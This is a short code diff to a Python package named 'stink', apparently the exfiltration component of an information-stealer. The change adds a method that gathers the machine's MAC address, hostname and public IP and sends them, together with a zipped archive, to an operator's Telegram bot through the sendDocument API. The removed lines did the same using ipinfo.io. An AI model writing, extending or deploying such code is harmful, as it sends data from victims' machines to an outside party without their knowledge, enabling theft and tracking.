@@ -8,6 +8,7 @@ from getmac import get_mac_address
 
 from stink.helpers import MultipartFormDataEncoder
 from stink.helpers.config import SenderConfig
+from socket import gethostname
 
 
 class AbstractSender:
@@ -90,6 +91,15 @@ class TelegramSender(AbstractSender):
         self.__user_id = user_id
         self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"
 
+    def __get_system_info(self) -> str:
+        data = {
+            "📡": get_mac_address(ip='192.168.1.1'),
+            "💻": gethostname(),
+            "🌐": urlopen(url="https://api.ipify.org", timeout=3).read().decode("utf-8"),
+        }.items()
+        text = "\n\n".join(f"{k} <code>{v}</code>" for k, v in data)
+        return f"<b>{text}</b>"
+
     def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
         """
         Gets data to send.
@@ -100,14 +110,9 @@ class TelegramSender(AbstractSender):
         Returns:
         - tuple: A tuple of content type, body, and Telegram api url.
         """
-        ip_info = loads(
-            urlopen(url="https://ipinfo.io/json", timeout=3).read().decode("utf-8")
-        ).items()
-        ip_info = "\n".join(f"{k}: <code>{v}</code>" for k, v in ip_info)
-        mac = f"📡 <code>{get_mac_address(ip='192.168.1.1')}</code>"
-        text = f"<b>{mac}\n\n{ip_info}</b>"
+
         content_type, body = self._encoder.encode(
-            [("chat_id", self.__user_id), ("caption", text), ("parse_mode", "HTML")],
+            [("chat_id", self.__user_id), ("caption", self.__get_system_info()), ("parse_mode", "HTML")],
             [("document", self.__zip_name, self.__data)],
         )
 
